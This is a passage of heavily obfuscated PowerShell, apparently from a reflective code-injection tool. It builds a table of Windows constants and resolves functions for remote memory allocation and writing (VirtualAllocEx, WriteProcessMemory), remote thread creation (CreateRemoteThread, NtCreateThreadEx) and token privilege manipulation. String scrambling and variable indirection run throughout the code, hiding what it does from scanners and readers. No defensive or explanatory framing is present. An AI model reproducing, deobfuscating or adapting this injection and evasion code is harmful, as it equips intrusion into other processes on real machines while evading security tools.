		${WI`N`32coN`StANts} | &("{1}{2}{0}" -f '-Member','Ad','d') -MemberType ("{3}{1}{0}{2}"-f't','oteProper','y','N') -Name ("{6}{5}{4}{0}{1}{3}{2}"-f'I','STI','IC_BASE','CS_DYNAM','LCHARACTER','E_DL','IMAG') -Value 0x40
		${w`IN3`2C`onstanTS} | &("{0}{2}{1}" -f'Ad','ember','d-M') -MemberType ("{2}{0}{1}"-f'Proper','ty','Note') -Name ("{0}{3}{4}{5}{1}{2}"-f'IMAGE_DLLC','CTE','RISTICS_NX_COMPAT','H','AR','A') -Value 0x100
		${wIn3`2c`o`NsTanTs} | &("{1}{0}{2}"-f 'embe','Add-M','r') -MemberType ("{3}{0}{1}{2}" -f'eP','ro','perty','Not') -Name ("{2}{1}{0}"-f'E','M_RELEAS','ME') -Value 0x8000
		${w`In3`2cOnstAN`TS} | &("{1}{0}{2}"-f'd-','Ad','Member') -MemberType ("{2}{1}{0}"-f'perty','ePro','Not') -Name ("{0}{1}{2}"-f 'T','OKE','N_QUERY') -Value 0x0008
		${wI`N32`coNst`ANtS} | &("{2}{3}{1}{0}" -f'er','emb','Add','-M') -MemberType ("{1}{2}{0}" -f 'y','NotePro','pert') -Name ("{3}{2}{5}{4}{0}{1}" -f 'RIVILEGE','S','JU','TOKEN_AD','T_P','S') -Value 0x0020
		${wi`N32coNsT`AN`TS} | &("{1}{0}{3}{2}" -f'em','Add-M','r','be') -MemberType ("{2}{3}{1}{0}"-f 'y','ropert','Note','P') -Name ("{2}{5}{4}{6}{0}{3}{1}"-f 'N','D','SE_P','ABLE','VILE','RI','GE_E') -Value 0x2
		${WIn3`2CoNST`AnTs} | &("{0}{1}{2}" -f'Add-Mem','b','er') -MemberType ("{0}{1}{2}" -f'Note','Prop','erty') -Name ("{2}{3}{0}{1}"-f'R','_NO_TOKEN','ER','RO') -Value 0x3f0
		
		return ${win3`2c`On`sTAnts}
	}

	Function gEt-WIn`32FuN`CT`ionS
	{
		${w`i`N32fUnCT`ionS} = &("{2}{0}{1}{3}" -f 'Ob','j','New-','ect') ("{4}{3}{0}{1}{2}" -f'.','Obje','ct','ystem','S')
		
		${VIrt`UaLaL`lo`caD`dr} = &("{3}{1}{2}{0}" -f 'ddress','Proc','A','Get-') ("{1}{2}{0}"-f'l','kernel3','2.dl') ("{1}{0}{2}" -f'alAll','Virtu','oc')
		${vi`R`TuaLalL`OCDel`e`GatE} = &("{2}{1}{0}{3}" -f'Ty','ate','Get-Deleg','pe') @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${vir`TUAl`All`Oc} =   ( &("{0}{1}" -f'IT','EM') ('V'+'a'+'riAb'+'Le:'+'15y4hs'))."VA`LUe"::("{1}{2}{3}{5}{6}{4}{0}" -f'onPointer','Ge','tDeleg','at','i','eForFunc','t').Invoke(${vi`RtuaLA`llOC`ADdr}, ${V`iRtUa`L`ALlo`Cd`elEGAte})
		${wI`N`32fu`NCtiO`NS} | &("{3}{2}{1}{0}" -f 'ber','em','d-M','Ad') ("{1}{3}{0}{2}" -f 'eP','N','roperty','ot') -Name ("{3}{1}{0}{2}"-f 'ualAll','irt','oc','V') -Value ${VIrtU`Alal`LOc}
		
		${virtuALAL`L`Oc`eXADdr} = &("{0}{2}{3}{1}" -f'Get','s','-ProcAddre','s') ("{2}{1}{0}"-f'.dll','32','kernel') ("{1}{3}{0}{2}"-f'c','Virtua','Ex','lAllo')
		${v`iRT`Ual`Al`LOCEXDeLEg`Ate} = &("{2}{0}{1}{3}"-f 'le','gat','Get-De','eType') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${vI`RTUaLALlo`cEX} =   (&("{0}{2}{3}{1}" -f 'GeT','E','-VA','riaBl') 15Y4hS  -Val  )::("{6}{4}{0}{1}{3}{2}{5}"-f 'lega','t','ionPoi','eForFunct','De','nter','Get').Invoke(${v`I`RtU`AL`ALlO`CEXA`DDR}, ${VIr`T`UA`lAlLOcEXdElEGATe})
		${WiN`32fUNc`T`Io`Ns} | &("{1}{2}{0}" -f 'ber','A','dd-Mem') ("{0}{2}{3}{1}" -f'Not','perty','e','Pro') -Name ("{0}{4}{1}{3}{2}" -f'Vi','Al','cEx','lo','rtual') -Value ${VIRT`UALAll`ocEx}
		
		${MEMC`P`YaD`DR} = &("{3}{1}{0}{4}{2}" -f'dd','t-ProcA','ess','Ge','r') ("{1}{2}{0}" -f 'rt.dll','ms','vc') ("{0}{1}" -f 'me','mcpy')
		${ME`mCp`YD`ele`gATe} = &("{2}{1}{3}{0}"-f'e','Deleg','Get-','ateTyp') @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${me`M`cPy} =  (&("{0}{1}"-f 'vaRi','able') 15y4hS)."Va`LuE"::("{4}{7}{5}{2}{3}{0}{1}{6}"-f 'int','e','F','unctionPo','Ge','r','r','tDelegateFo').Invoke(${MemCp`y`AD`dr}, ${MeMC`p`y`delE`GAtE})
		${w`in32Fu`NCTI`O`Ns} | &("{0}{1}{2}"-f'Add-Me','mbe','r') -MemberType ("{3}{2}{0}{1}" -f'e','rty','p','NotePro') -Name ("{0}{1}"-f 'm','emcpy') -Value ${m`e`MCPY}
		
		${M`emSeT`ADDR} = &("{3}{1}{0}{2}"-f 'ocAddres','et-Pr','s','G') ("{1}{2}{3}{0}"-f'.dll','msv','c','rt') ("{1}{0}"-f't','memse')
		${MemSetDeLe`g`A`Te} = &("{1}{4}{3}{0}{2}"-f'ateTyp','Get-D','e','g','ele') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${Me`mseT} =   $15y4Hs::("{0}{4}{5}{1}{6}{3}{2}" -f'Get','F','ointer','onP','Delegat','e','orFuncti').Invoke(${MEM`se`TaDDR}, ${MEmSe`T`deLe`GAtE})
		${w`in3`2FUN`ctiOns} | &("{2}{1}{0}"-f'mber','dd-Me','A') -MemberType ("{2}{3}{0}{1}" -f 'pe','rty','Not','ePro') -Name ("{0}{1}"-f'mems','et') -Value ${mEmS`et}
		
		${LO`Adl`i`BRarYADdR} = &("{1}{0}{3}{2}" -f '-ProcAdd','Get','ess','r') ("{2}{1}{0}{3}"-f'2.d','rnel3','ke','ll') ("{2}{3}{1}{0}"-f'A','dLibrary','L','oa')
		${l`OaD`liBRA`RY`DeLeg`ATe} = &("{2}{0}{3}{1}" -f 'Ty','e','Get-Delegate','p') @([String]) ([IntPtr])
		${L`OaDLi`B`RArY} =   (  &("{1}{0}"-f 'e','VariabL')  15Y4HS -vAlU  )::("{0}{5}{2}{1}{3}{4}{6}"-f'GetDe','u','eForF','ncti','o','legat','nPointer').Invoke(${l`OaD`l`iB`RARyAdDr}, ${L`OAd`L`IBR`ARydelegatE})
		${w`iN32fuNctI`o`NS} | &("{0}{2}{1}" -f 'Ad','r','d-Membe') -MemberType ("{3}{1}{2}{0}" -f'erty','eP','rop','Not') -Name ("{1}{2}{3}{0}"-f'ry','Lo','adLi','bra') -Value ${lO`AD`l`iBRAry}
		
		${GEtpRo`cAD`dresSA`ddR} = &("{3}{2}{0}{1}"-f'dre','ss','cAd','Get-Pro') ("{1}{0}{3}{2}" -f 'e','k','el32.dll','rn') ("{2}{3}{0}{1}" -f'ocAddres','s','GetP','r')
		${G`ETp`R`Oc`AdD`REs`sdELEg`AtE} = &("{1}{2}{0}{4}{3}" -f 'ega','Get-','Del','pe','teTy') @([IntPtr], [String]) ([IntPtr])
		${g`e`TPRO`cAdDress} =   $15Y4hs::("{4}{8}{5}{2}{6}{3}{1}{7}{0}"-f'inter','t','a','eForFunc','GetD','leg','t','ionPo','e').Invoke(${G`eTPROca`D`Dre`S`SadDr}, ${get`p`R`o`CadDreSSd`ELegaTe})
		${Wi`N32f`U`NCT`iOns} | &("{1}{2}{0}" -f 'Member','A','dd-') -MemberType ("{2}{3}{0}{1}" -f 'Pro','perty','N','ote') -Name ("{3}{2}{0}{1}" -f'dres','s','rocAd','GetP') -Value ${getp`Roc`Add`R`Ess}
		
		${getpROcadD`RessO`RDIN`A`LaDdR} = &("{4}{1}{2}{3}{0}" -f 'ocAddress','t','-P','r','Ge') ("{2}{0}{1}{3}" -f 'l','32.dl','kerne','l') ("{0}{1}{2}{3}"-f'GetProc','A','ddre','ss')
		${G`E`TprO`cAdD`R`es`SORDinaldELE`GAte} = &("{0}{1}{3}{2}"-f 'G','et-','Type','Delegate') @([IntPtr], [IntPtr]) ([IntPtr])
		${GEtpro`cA`dD`Ress`O`RD`iNAL} =  $15Y4HS::("{2}{5}{6}{7}{1}{4}{0}{3}{8}" -f 'P','rFunc','G','oin','tion','etDeleg','a','teFo','ter').Invoke(${GeTPRO`CADdReSs`orDin`A`l`AddR}, ${gEtP`R`oc`Ad`dReSS`oRDiN`A`LDElE`gaTE})
		${WIN32`Func`T`ioNs} | &("{1}{2}{0}{3}"-f'b','A','dd-Mem','er') -MemberType ("{0}{3}{2}{1}"-f 'N','y','rt','otePrope') -Name ("{1}{5}{3}{0}{2}{4}"-f'ssO','G','rd','rocAddre','inal','etP') -Value ${GeTP`R`oCadDrESs`Or`DInaL}
		
		${vIr`Tual`F`REea`ddr} = &("{4}{3}{1}{0}{2}" -f 're','dd','ss','t-ProcA','Ge') ("{0}{1}{2}"-f 'k','er','nel32.dll') ("{0}{3}{2}{1}" -f 'V','alFree','rtu','i')
		${v`iR`TuAlF`R`eeDeleGa`TE} = &("{0}{2}{3}{1}"-f'G','ateType','et-D','eleg') @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${Vi`RtUa`Lfr`Ee} =   (&("{1}{0}{2}{3}"-f'T','Ge','-','VARiabLE') ("1"+"5Y4HS") )."Va`LUE"::("{1}{2}{0}{4}{3}{5}"-f 'r','GetDele','gateFo','unction','F','Pointer').Invoke(${VIrt`U`ALfre`eAd`dr}, ${virTuaL`FRe`edE`legA`Te})
		${wi`N`3`2f`UNCtIoNs} | &("{1}{2}{0}"-f'er','Ad','d-Memb') ("{0}{2}{3}{1}"-f'Not','erty','eP','rop') -Name ("{0}{2}{1}{3}"-f 'V','a','irtu','lFree') -Value ${ViR`T`UalFr`EE}
		
		${v`Irt`UaLF`R`eeexa`dDr} = &("{0}{2}{3}{1}"-f 'G','ss','et-P','rocAddre') ("{0}{3}{1}{2}" -f'kernel32','d','ll','.') ("{1}{2}{0}"-f'tualFreeEx','Vi','r')
		${vIRt`U`AL`FReeExdeLeg`A`TE} = &("{2}{1}{0}{3}" -f't','et-Delega','G','eType') @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${vI`R`TUALf`RE`EEx} =  ( &("{0}{3}{2}{1}" -f 'get','item','Ld','-CHi')  ("VA"+"RiAbL"+"e:1"+"5y4hS")  )."va`LuE"::("{1}{5}{6}{4}{2}{3}{0}"-f 'nPointer','G','ForFunc','tio','ate','etDele','g').Invoke(${viRt`UAlfRE`Ee`XadDR}, ${vi`RT`UAlFr`eEEXde`LE`GaTe})
		${wi`N3`2f`UNctIO`NS} | &("{2}{1}{0}" -f 'r','-Membe','Add') ("{1}{0}{2}"-f 'otePro','N','perty') -Name ("{0}{3}{1}{2}"-f 'Vi','t','ualFreeEx','r') -Value ${Vir`TUAlfr`e`EeX}
		
		${viR`T`UALPROt`eCTa`dDr} = &("{2}{1}{0}" -f'ess','et-ProcAddr','G') ("{1}{2}{0}{3}"-f '32.','ker','nel','dll') ("{3}{2}{1}{0}" -f'ect','rot','tualP','Vir')
		${V`iRt`UAlp`Ro`TEcTdELeGatE} = &("{2}{0}{1}{3}" -f'et','-Delegate','G','Type') @([IntPtr], [UIntPtr], [UInt32],   (  &("{1}{0}"-f'ItEM','get-')  ('VA'+'RiAb'+'LE:M28R'+'76')  )."V`ALuE".("{3}{0}{1}{4}{2}"-f 'ke','B','Type','Ma','yRef').Invoke()) ([Bool])
		${VIr`T`UALpRotE`cT} =  (  &("{1}{0}{2}" -f'Iabl','VaR','E')  15Y4hs)."V`ALuE"::("{5}{0}{6}{1}{2}{4}{3}" -f'etDe','ateFor','F','tionPointer','unc','G','leg').Invoke(${Vi`RTua`LPRoTe`cTAd`dr}, ${viR`TuA`LPR`OTECTde`LeGATE})
		${W`in32FunCTi`O`Ns} | &("{1}{2}{3}{0}"-f 'r','Add','-M','embe') ("{2}{0}{1}" -f'oper','ty','NotePr') -Name ("{2}{1}{0}{3}"-f 'P','l','Virtua','rotect') -Value ${vIRt`U`A`Lprote`cT}
		
		${GetMoDu`LeHa`N`DLeA`ddr} = &("{1}{3}{4}{2}{0}"-f'ss','Get-','e','ProcAd','dr') ("{2}{3}{1}{0}" -f 'dll','.','ker','nel32') ("{0}{2}{3}{1}" -f 'Ge','eHandleA','tMod','ul')
		${G`etMO`Du`LeHa`NdL`eDELe`G`Ate} = &("{0}{1}{3}{2}{4}" -f 'G','et-','e','Delegat','Type') @([String]) ([IntPtr])
		${GeT`m`ODUleHAN`dlE} =   $15y4hs::("{7}{5}{4}{2}{0}{3}{6}{1}"-f'u','nter','rF','nctionP','legateFo','e','oi','GetD').Invoke(${GETmOd`UlE`HAnd`L`eaddr}, ${GE`TmoDu`lEh`A`NdL`E`DelE`GAte})
		${WI`N32FU`NcT`iONS} | &("{3}{2}{1}{0}" -f 'er','mb','-Me','Add') ("{2}{0}{3}{1}"-f'ote','ty','N','Proper') -Name ("{3}{1}{0}{2}"-f 'H','tModule','andle','Ge') -Value ${getm`Odu`lEhaNd`LE}
		
		${fRe`El`i`B`RArYaddr} = &("{1}{0}{2}{3}"-f'rocAddr','Get-P','es','s') ("{2}{1}{0}" -f 'dll','rnel32.','ke') ("{2}{1}{0}"-f'rary','eLib','Fre')
		${fr`E`E`LIBrary`DE`leg`ATE} = &("{2}{5}{4}{1}{3}{0}"-f 'ateType','le','Ge','g','e','t-D') @([Bool]) ([IntPtr])
		${F`Re`E`lIBrARy} =   (  &("{1}{0}"-f'm','iTE') ('VAR'+'i'+'AB'+'lE:1'+'5Y4hS') )."Va`luE"::("{5}{1}{4}{0}{3}{2}"-f'Point','ga','r','e','teForFunction','GetDele').Invoke(${FreEL`ib`RAR`Ya`dDR}, ${FRee`li`BRa`Ryd`ElE`GATE})
		${w`i`N32`FuNCtIoNs} | &("{2}{1}{0}"-f'-Member','d','Ad') -MemberType ("{1}{0}{2}" -f'oteProp','N','erty') -Name ("{1}{2}{0}{3}"-f 'e','Fr','e','Library') -Value ${f`REel`IBRAry}
		
		${OpEnp`RoCe`S`S`AdDR} = &("{1}{0}{4}{3}{2}"-f't-Proc','Ge','ss','re','Add') ("{1}{0}{2}"-f'nel32.','ker','dll') ("{2}{0}{1}"-f 'ro','cess','OpenP')
	    ${O`pEnprocESSd`el`eG`A`TE} = &("{4}{5}{0}{3}{1}{2}"-f'g','teTyp','e','a','Get-Del','e') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${OP`ENPRO`c`esS} =   (&("{1}{0}" -f 'iR','d') VaRIABLe:15y4hS)."V`ALue"::("{5}{0}{3}{4}{2}{1}" -f 'ele','ointer','nP','g','ateForFunctio','GetD').Invoke(${O`PE`Np`ROceSS`ADdr}, ${op`eNpRO`cEssD`elEGATe})
		${W`in`32fUnCt`IO`Ns} | &("{1}{0}{2}" -f'd-Membe','Ad','r') -MemberType ("{0}{3}{1}{2}"-f 'No','pert','y','tePro') -Name ("{3}{1}{0}{2}"-f'ce','nPro','ss','Ope') -Value ${OPE`Np`ROce`sS}
		
		${WAi`TFoRS`ingL`E`O`BJE`C`Taddr} = &("{3}{2}{1}{0}{4}"-f 'Addr','roc','-P','Get','ess') ("{0}{3}{2}{1}"-f 'ke','.dll','nel32','r') ("{4}{2}{0}{3}{1}"-f 'orSin','bject','F','gleO','Wait')
	    ${WaIT`F`Or`S`i`NGleOBjECTdEL`EgatE} = &("{2}{3}{0}{4}{1}"-f'Delega','Type','G','et-','te') @([IntPtr], [UInt32]) ([UInt32])
	    ${W`AItfoRS`inGl`eoBJE`cT} =   $15y4HS::("{5}{8}{1}{2}{3}{4}{6}{0}{7}"-f 'P','F','o','rFun','c','GetDelegat','tion','ointer','e').Invoke(${W`AI`Tf`o`RsiNgL`eoBJEctAd`DR}, ${wAiT`FO`R`sIN`g`LE`objECTd`e`legAtE})
		${wi`N32`FUNC`TiOns} | &("{2}{1}{0}"-f'r','-Membe','Add') -MemberType ("{1}{3}{0}{2}" -f 'rop','No','erty','teP') -Name ("{0}{1}{5}{3}{2}{4}"-f'Wait','ForSing','jec','b','t','leO') -Value ${WAI`TforSinGlE`OBJ`E`Ct}
		
		${w`RItEpRO`c`E`sSM`eMor`yAddR} = &("{1}{2}{0}{3}"-f 'ocAddre','G','et-Pr','ss') ("{0}{2}{1}" -f 'ker','l32.dll','ne') ("{0}{1}{2}{3}"-f'WriteProcessMe','m','o','ry')
        ${WriteProCESSm`emo`R`Y`dEl`eGaTe} = &("{2}{1}{0}{3}"-f'ate','-Deleg','Get','Type') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   (&("{2}{0}{1}" -f'T-vaR','Iable','gE') ('P'+'IMbt') -VaL  ).("{0}{1}{2}{3}" -f'MakeB','y','Re','fType').Invoke()) ([Bool])
        ${WRi`TePrOC`ESS`MEM`oRy} =  $15Y4Hs::("{6}{1}{4}{2}{3}{5}{0}" -f 'er','g','orFun','ct','ateF','ionPoint','GetDele').Invoke(${wri`TepR`oceSSME`MOR`Y`A`ddr}, ${W`R`it`ePRoceS`SmEmOrYD`EL`e`GAtE})
		${WiN`32f`UnCT`i`ons} | &("{2}{0}{1}" -f'-','Member','Add') -MemberType ("{0}{1}{2}"-f'NoteP','r','operty') -Name ("{0}{1}{3}{2}" -f'WritePro','c','ory','essMem') -Value ${W`RIt`EpRO`Ces`SMeMORy}
		
		${Re`Ad`proCEssMe`M`ory`A`DDR} = &("{1}{2}{3}{0}" -f 'dress','Get-','Pr','ocAd') ("{2}{1}{0}"-f '.dll','rnel32','ke') ("{3}{0}{4}{2}{1}{5}"-f'r','sMemor','es','ReadP','oc','y')
        ${rE`A`DPRoCeSsme`m`oRydE`LeGAtE} = &("{3}{2}{1}{0}"-f 'e','Typ','-Delegate','Get') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   (&('Gi')  ("VAri"+"A"+"bL"+"e:pImbt") )."VA`LuE".("{2}{1}{3}{0}"-f 'fType','y','MakeB','Re').Invoke()) ([Bool])
        ${R`eA`dPROCe`Ss`MEm`ORy} =  ( &("{2}{1}{0}"-f 'bLE','RIA','va') 15y4HS )."va`lUe"::("{1}{4}{5}{0}{7}{2}{6}{8}{3}"-f 'teF','Ge','unct','er','tDe','lega','i','orF','onPoint').Invoke(${ReaDpRo`cESsMe`mo`Ry`A`d`dR}, ${rEAd`PrOcE`SsM`EMo`RydE`LeG`A`TE})
		${Wi`N32`FUNC`TIONs} | &("{0}{1}{2}"-f 'A','dd','-Member') -MemberType ("{3}{2}{1}{0}" -f 'rty','ePrope','t','No') -Name ("{5}{4}{0}{3}{1}{2}" -f'es','o','ry','sMem','Proc','Read') -Value ${read`pROCE`SSmeM`O`RY}
		
		${CReatER`eMO`T`ETHrE`AdA`D`Dr} = &("{1}{3}{2}{0}" -f 'ss','G','ocAddre','et-Pr') ("{3}{0}{2}{1}" -f'l','ll','32.d','kerne') ("{3}{4}{0}{1}{2}" -f 'ea','te','RemoteThread','C','r')
        ${Cre`At`eRemotEt`h`R`e`A`DdeleGA`Te} = &("{2}{1}{0}{3}"-f 'Delega','et-','G','teType') @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${cR`Ea`TErEMO`Teth`Read} =  (  &("{0}{1}" -f'It','em') ('v'+'ar'+'IabLE:15y4'+'h'+'S'))."va`luE"::("{5}{3}{0}{2}{6}{4}{7}{1}"-f 'For','nPointer','Fun','e','t','GetDelegat','c','io').Invoke(${creATeremOtE`T`h`R`e`A`DaD`dR}, ${C`REa`T`eREmOT`ETHR`E`A`dDelEGate})
		${W`iN`32FUn`cTionS} | &("{0}{1}{2}" -f 'A','dd','-Member') -MemberType ("{1}{0}{2}" -f'eP','Not','roperty') -Name ("{0}{4}{2}{3}{1}"-f 'Create','read','T','h','Remote') -Value ${cr`e`Ate`ReMo`T`EtHRead}
		
		${gE`T`EXI`TcoDETHrE`A`DAD`dR} = &("{0}{1}{2}" -f'Get-P','roc','Address') ("{2}{1}{0}{3}" -f'd','el32.','kern','ll') ("{2}{0}{1}{4}{3}" -f'itC','odeT','GetEx','d','hrea')
        ${g`et`E`X`ITC`O`DeTHreadDE`Le`gate} = &("{2}{4}{3}{0}{1}"-f'ateTy','pe','Get','eleg','-D') @([IntPtr],  (&("{2}{0}{3}{1}"-f '-','item','GEt','chIlD')  ("vA"+"Ri"+"abLE"+":Jmgn") )."vAL`Ue".("{3}{1}{2}{0}"-f'fType','By','Re','Make').Invoke()) ([Bool])
        ${g`ETe`xITC`o`dethreAD} =   (  &("{1}{3}{2}{0}" -f 'riabLE','gEt','VA','-') 15y4hS)."v`ALUe"::("{0}{1}{3}{4}{5}{8}{6}{2}{7}"-f'GetD','eleg','nt','at','eForFun','c','Poi','er','tion').Invoke(${gETE`x`iTC`o`dEthReaD`ADdR}, ${getexITcoD`ET`hReA`DdeleG`A`TE})
		${WI`N32fUN`cti`oNs} | &("{0}{3}{1}{2}"-f'Ad','M','ember','d-') -MemberType ("{2}{0}{1}"-f'Propert','y','Note') -Name ("{0}{1}{2}{3}"-f'GetE','xitCode','Thre','ad') -Value ${gE`Tex`ItcodeTh`REad}
		
		${Op`EnT`HR`eAdT`Oke`NADdr} = &("{3}{0}{2}{1}" -f 'A','ress','dd','Get-Proc') ("{0}{1}{2}{3}"-f'Advapi','3','2.dl','l') ("{2}{1}{0}" -f'ken','readTo','OpenTh')
        ${opE`NtH`Rea`dTOK`ENdel`E`GATE} = &("{2}{0}{3}{1}" -f 't-DelegateT','pe','Ge','y') @([IntPtr], [UInt32], [Bool],   (&("{0}{1}{2}"-f 'G','eT-iT','Em') VARiaBlE:1I2L)."vA`luE".("{1}{0}{3}{2}"-f 'ByRefT','Make','e','yp').Invoke()) ([Bool])
        ${opENt`H`REAdtOk`En} =   ( &("{2}{1}{0}"-f'e','bL','VaRiA')  15y4Hs )."V`AlUE"::("{1}{2}{0}{3}{4}"-f 't','GetDeleg','a','eFor','FunctionPointer').Invoke(${OP`eNt`HR`E`ADt`OkE`NADdr}, ${O`PEnt`hREadt`okeNDE`lEgaTe})
		${WI`N32Fun`CTi`o`Ns} | &("{2}{0}{1}" -f 'mbe','r','Add-Me') -MemberType ("{1}{2}{0}"-f 'ty','NotePro','per') -Name ("{0}{2}{3}{4}{1}" -f 'Ope','en','nTh','re','adTok') -Value ${OpeNt`h`ReA`D`Token}
		
		${g`etcurre`NTt`Hr`ea`Dad`dR} = &("{2}{4}{1}{3}{0}" -f's','dre','Get-P','s','rocAd') ("{3}{2}{1}{0}" -f'dll','32.','nel','ker') ("{2}{1}{0}{3}{4}"-f 'tT','etCurren','G','h','read')
        ${g`etCU`RRENt`TH`READdEL`Eg`ATe} = &("{2}{0}{3}{1}"-f 'elegat','ype','Get-D','eT') @() ([IntPtr])
        ${g`ETCU`RRE`NttHr`eAD} =  $15y4Hs::("{1}{4}{8}{7}{2}{0}{3}{6}{5}" -f'on','Get','ForFuncti','P','Del','nter','oi','e','egat').Invoke(${gEtCuRRE`NTT`H`R`E`ADAD`DR}, ${g`EtC`UrReNtTh`ReA`D`deLeGATe})
		${WIn32f`UNctI`O`NS} | &("{2}{0}{1}" -f'embe','r','Add-M') -MemberType ("{3}{2}{1}{0}" -f 'ty','roper','P','Note') -Name ("{2}{1}{3}{0}{4}" -f'ea','Current','Get','Thr','d') -Value ${G`EtCU`RR`ENTtH`REaD}
		
		${ADJU`SttOKe`Np`R`Ivi`lEgEsaDdr} = &("{2}{3}{1}{4}{0}"-f 's','ProcAd','G','et-','dres') ("{2}{0}{1}"-f '32.d','ll','Advapi') ("{6}{4}{2}{3}{0}{5}{1}" -f'ivi','es','Tok','enPr','ust','leg','Adj')
        ${aDjUsTtOkenpRiVI`Le`GEs`D`EL`eGaTe} = &("{2}{3}{0}{1}" -f 'ateTyp','e','Get-De','leg') @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${aDjusttOkEN`P`RiVi`le`gES} =  $15Y4hS::("{7}{3}{6}{2}{4}{8}{5}{0}{1}" -f 'i','nter','teFo','g','rFu','o','a','GetDele','nctionP').Invoke(${a`dju`s`TtOKe`NPRIviL`EGeSADdr}, ${a`DJustt`o`Ke`N`PriViLeGEsdel`eg`ATE})
		${wiN32FuNcTi`o`Ns} | &("{2}{1}{0}"-f'ember','-M','Add') -MemberType ("{3}{2}{1}{0}" -f'rty','Prope','ote','N') -Name ("{3}{0}{2}{1}{4}" -f 'djust','rivil','TokenP','A','eges') -Value ${AD`jUsT`TOKE`Npri`VIl`E`geS}
		
		${lOo`KUPpRIVi`l`eGev`ALUEADDr} = &("{1}{2}{0}{3}" -f'Addres','Ge','t-Proc','s') ("{1}{0}{2}" -f 'pi','Adva','32.dll') ("{1}{2}{4}{0}{3}"-f 'ge','LookupP','ri','ValueA','vile')
        ${lo`oKupPRiviLE`GEvaLUEd`ElEGA`Te} = &("{2}{1}{3}{0}"-f'ateType','-Del','Get','eg') @([String], [String], [IntPtr]) ([Bool])
        ${l`oOKuPP`R`iVILeg`eVAl`Ue} =  $15y4hs::("{5}{4}{1}{6}{0}{3}{2}"-f 'ion','Func','er','Point','legateFor','GetDe','t').Invoke(${Lo`O`kUppRIvILeGEV`ALUE`A`D`DR}, ${LO`oKuP`pr`IVI`le`GeV`AL`UeD`ElEgATE})
		${WI`N32FuNcTi`oNS} | &("{1}{0}{2}" -f 'b','Add-Mem','er') -MemberType ("{0}{3}{2}{1}" -f 'Note','y','pert','Pro') -Name ("{3}{2}{0}{4}{1}"-f'vilegeVal','e','okupPri','Lo','u') -Value ${l`oOkuPP`R`IvI`legEv`AlUe}
		
		${imP`E`RS`oN`ATESelF`ADdR} = &("{2}{4}{1}{0}{3}"-f 'cAddres','Pro','Get','s','-') ("{0}{2}{1}"-f 'Adv','l','api32.dl') ("{3}{2}{1}{0}" -f 'lf','sonateSe','r','Impe')
        ${I`M`pers`OnaTE`sELFDeL`e`ga`Te} = &("{4}{0}{1}{3}{2}" -f 'et-','Del','ype','egateT','G') @([Int32]) ([Bool])
        ${I`Mpe`RSoN`AtEs`ELf} =   $15y4Hs::("{1}{0}{4}{7}{2}{5}{3}{8}{6}" -f 'D','Get','o','oint','elega','nP','r','teForFuncti','e').Invoke(${iMpER`S`onaTeS`e`lfADDr}, ${Im`p`erS`ONAtes`ELfDe`Lega`TE})
		${WIN`32F`UnCT`Ions} | &("{1}{2}{0}" -f'r','Add-M','embe') -MemberType ("{1}{0}{2}{3}"-f 'teP','No','rope','rty') -Name ("{4}{1}{2}{3}{0}"-f'f','ersona','t','eSel','Imp') -Value ${ImPErSoN`A`TE`S`ELf}
		
		${n`TcRE`AT`eThr`EA`d`EXAddr} = &("{3}{2}{4}{1}{0}"-f 's','s','t-Pro','Ge','cAddre') ("{2}{0}{1}"-f'Dll.','dll','Nt') ("{3}{2}{1}{4}{0}" -f 'readEx','at','Cre','Nt','eTh')
        ${n`TcR`e`ATEt`h`REA`deXdeLegA`TE} = &("{2}{4}{3}{1}{0}" -f'ateType','g','Ge','-Dele','t') @(  (  &("{1}{0}" -f'R','Di')  VaRIablE:1i2l  )."V`AluE".("{0}{2}{1}"-f'M','fType','akeByRe').Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        ${N`Tcr`eaTe`ThreadeX} =  $15y4HS::("{5}{0}{1}{3}{2}{4}" -f 'Delega','teF','ionPointe','orFunct','r','Get').Invoke(${NTCr`eatethrE`A`dexADDr}, ${nT`CREA`TethR`EadEXDELE`GATe})
		${wiN`32fuN`CtIO`NS} | &("{0}{1}{2}"-f 'Add-','Mem','ber') -MemberType ("{1}{0}{3}{2}" -f 'teP','No','rty','rope') -Name ("{2}{4}{3}{1}{0}" -f'dEx','ea','N','reateThr','tC') -Value ${n`TCrEatE`T`HReADEx}
		
		${IsWO`w6`4`Proc`ESS`A`ddr} = &("{2}{1}{0}{4}{3}"-f '-ProcAdd','et','G','ss','re') ("{0}{2}{3}{1}"-f 'Ker','ll','nel32','.d') ("{0}{3}{1}{2}" -f 'Is','64Pr','ocess','Wow')
        ${i`sWO`W`64p`RocE`SSDe`Lega`Te} = &("{2}{0}{1}{3}" -f 'g','ateTy','Get-Dele','pe') @([IntPtr],   (  &("{2}{0}{1}" -f 'iAb','lE','vAR') B1gF  )."Va`lue".("{1}{2}{0}"-f'fType','Ma','keByRe').Invoke()) ([Bool])
        ${iSw`ow`64pr`OCeSS} =   (&("{1}{0}" -f 'Ci','G')  ("VA"+"RI"+"aBLE"+":15y4hS") )."VA`luE"::("{3}{4}{2}{5}{0}{1}{6}" -f 'Point','e','Func','Ge','tDelegateFor','tion','r').Invoke(${I`sWoW6`4ProcESsad`Dr}, ${I`SwOw`64`Pr`OcE`ssdEL`egatE})
		${WiN32f`UNctIo`Ns} | &("{1}{2}{0}"-f'ber','Add-M','em') -MemberType ("{2}{0}{1}{3}"-f 'otePr','ope','N','rty') -Name ("{3}{1}{4}{0}{2}" -f 'roc','o','ess','IsW','w64P') -Value ${IS`w`OW`64proCE`Ss}
		
